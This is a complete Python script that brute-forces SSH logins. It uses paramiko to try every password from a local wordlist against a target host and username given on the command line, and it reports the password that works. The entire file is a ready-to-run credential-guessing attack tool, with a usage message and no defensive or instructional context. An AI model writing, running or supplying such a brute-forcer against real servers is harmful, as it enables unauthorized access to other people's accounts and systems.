import paramiko
import os
import sys

message = ["How to Use: python [script] [target] [user]","\nExample: python brute_force_ssh.py 127.0.0.1 anonymous"]

class Discover:
    #
    # Read Wordlist
    #
    def __init__(self,file: str):
        with open(file, 'r',encoding='utf-8') as f:
            self.password = f.read().splitlines()

class ValidateArgs:
  #
  # Validate Args
  #
  def __init__(self):
    if (len(sys.argv) != 3):
      print(message[0],message[1])
      sys.exit()

class SSHBruteClient:
    #
    # SSH Client
    #
    def __init__(self, target: str, user: str, password: str):
        self.target = target
        self.user = user
        self.password = password
        self.ssh_client = paramiko.SSHClient()
        self.ssh_client.load_system_host_keys()
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    def brute_force_initialize(self):
        try:
            self.ssh_client.connect(self.target, username= self.user, password=self.password)
        except paramiko.ssh_exception.AuthenticationException:
            print(f'Testing Password: {self.password}')
        else:
            print(f'[+] Password Found [+] : {self.password}')
            quit()
        self.ssh_client.close()

def main():
    directory = os.path.dirname(__file__)
    file = os.path.join(directory, "wordlist", "wordlist.txt")
    discover = Discover(file)

    ValidateArgs()
    _target = sys.argv[1]
    _user = sys.argv[2]

    for password in discover.password:
        ssh_client = SSHBruteClient(_target,_user, password)
        ssh_client.brute_force_initialize()

if __name__ == '__main__':
    main()
            
